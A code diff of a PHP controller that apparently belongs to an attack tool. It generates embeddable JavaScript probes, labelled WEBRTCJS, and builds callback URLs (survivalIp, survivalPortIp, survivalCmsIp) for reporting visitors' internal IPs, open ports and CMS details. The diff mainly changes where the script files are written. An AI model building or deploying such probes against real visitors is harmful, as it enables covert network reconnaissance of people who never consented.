@@ -4,10 +4,8 @@ use Think\Controller;
 class RootApiController extends Controller {
     public function _initialize(){
         $this->domain = 'http://'.I('server.HTTP_HOST');
-        $this->jspath = $this->domain.__ROOT__.str_replace('.','',CACHE_PATH);
+        $this->jspath = $this->domain."/jsProject/";
     }
-
-
     public function addProject(){
         if(I('post.name') == ""){
             $this->ajaxReturn(array(
@@ -25,7 +23,7 @@ class RootApiController extends Controller {
         $project['create_time'] = date('Y-m-d H:i:s');
         $projectData = M("project");
         $file = $this->jspath.$md5string.'.js';
-        $jsfile = CACHE_PATH.$md5string.'.js';
+        $jsfile = __ROOT__."jsProject/".$md5string.'.js';
         $sendsurvivalIp = $this->domain.U('Home/Api/survivalIp');
         $snedIteratesIpUrl = $this->domain.U('Home/Api/survivalPortIp');
         $snedIteratesCmsIpUrl = $this->domain.U('Home/Api/survivalCmsIp');
@@ -167,11 +165,12 @@ function stage(num){
     document.getElementsByTagName("body")[0].appendChild(updataStage);
 }
 WEBRTCJS;
-        file_put_contents($file, $content,LOCK_EX);
-        if(file_exists($file)){
+        file_put_contents($jsfile, $content,LOCK_EX);
+        if(file_exists($jsfile)){
+            $projectData->data($project)->add();
             $this->ajaxReturn(array(
                 "typeMsg" => "success",
-                "msgText" => "<script src='http://$domain/js/$md5string.js'></script>",
+                "msgText" => "<script src='$file'></script>",
             ));
         }else{
             $this->ajaxReturn(array(
